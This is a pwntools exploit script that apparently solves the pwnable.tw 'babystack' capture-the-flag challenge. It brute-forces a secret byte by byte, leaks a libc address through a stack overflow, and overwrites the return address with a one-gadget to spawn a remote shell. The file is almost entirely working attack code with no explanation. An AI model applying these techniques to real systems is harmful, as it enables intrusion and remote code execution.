#coding=utf8
from pwn import *
context.log_level = 'debug'
#context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./babystack',env={"LD_PRELOAD":"/mnt/hgfs/CTF/exercise/pwnable.tw/BabyStack/libc_64.so.6"})
	bin = ELF('./babystack')
	libc = ELF('./libc_64.so.6')
else:
	cn = remote('chall.pwnable.tw', 10205)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

rand_num=""

def guess(s):
	cn.recvuntil('>> ')
	cn.send('1'.ljust(0x10,'\x01'))
	d = cn.recv()
	if'Your passowrd :' not in d:
		cn.send('1'.ljust(0x10,'\x01'))
		cn.recvuntil('Your passowrd :')
	cn.send(s)
	d = cn.recvline()
	return d

def guess2(s):
	cn.recvuntil('>> ')
	cn.send('1'*8)
	d = cn.recv()
	if'Your passowrd :' not in d:
		cn.send('1'*8)
		cn.recvuntil('Your passowrd :')
	cn.send(s)
	d = cn.recvline()
	return d

def copy(s):
	cn.recvuntil('>> ')
	cn.sendline('3')
	cn.recvuntil('Copy :')
	cn.send(s)

for i in range(0x10):
	for j in range(1,0x101):
		if j == 0x100:
			success("leak fail!!")
			exit()
		if 'Success' in guess(rand_num+chr(j)+'\x00'):
			rand_num+=chr(j)
			success(rand_num.encode('hex'))
			break

pay = rand_num[:0x10].ljust(0x20,'\x00') + 'a'*0x20 + rand_num[:0x10] + '11111111'
guess(pay)

copy('a'*63)

rand_num = rand_num+'11111111'

for i in range(6):
	for j in range(1,0x101):
		if j == 0x100:
			success("leak fail!!")
			exit()
		if 'Success' in guess2(rand_num+chr(j)+'\x00'):
			rand_num+=chr(j)
			success(rand_num.encode('hex'))
			break

libc_base = u64(rand_num[0x18:]+'\x00\x00')-324-libc.sym['setvbuf']
success('libc_base: '+hex(libc_base))

onegadget = libc_base + 0x45216

pay = rand_num[:0x10].ljust(0x20,'\x00') + 'a'*0x20 + rand_num[:0x10] + '1'*0x10+'bbbbbbbb'+p64(onegadget)
guess(pay)

copy('a'*63)

cn.sendline('2')



'''
0b:0058│          0x7ffc1a191c18 —▸ 0x7f5cfef56fb4 (setvbuf+324) ◂— xor    edx, edx

0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
cn.interactive()
